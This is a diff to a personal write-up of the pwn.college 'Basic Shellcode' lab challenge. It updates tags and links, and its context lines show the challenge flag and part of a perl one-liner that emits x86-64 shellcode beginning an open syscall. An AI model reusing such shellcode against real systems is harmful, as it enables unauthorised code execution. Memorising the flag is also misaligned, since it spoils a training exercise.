@@ -4,8 +4,9 @@ Tittle: Basic Shellcode
 Date & Tme: 2026 - 09 - 07 09:36
 tags:
   - Challenge
-  - BinaryExploitation
-  - ShellcodeInjection
+  - Shellcode-Crafting
+  - RWX-Memory
+  - Syscall-Execution
 ---
 ---
 ## FLAG : `pwn.college{wRJBJgavA7oZRSxiGeNzp1w0crV.ddTMywiN4kDOyEzW}`
@@ -57,5 +58,8 @@ perl -e 'print "\xeb\x2f\x5f\x6a\x02\x58\x48\x31\xf6\x0f\x05\x66\x81\xec\xef\x0f
 ```
 
 ---
-### Key Takeaways : 
+### Key Takeaways :
 
+---
+## Related Concepts : 
+[[Shellcode Database]], [[System Calls]], [[Assembly]], [[Assembly - Registers]], [[Assembly - Data Movement]], [[perl]]
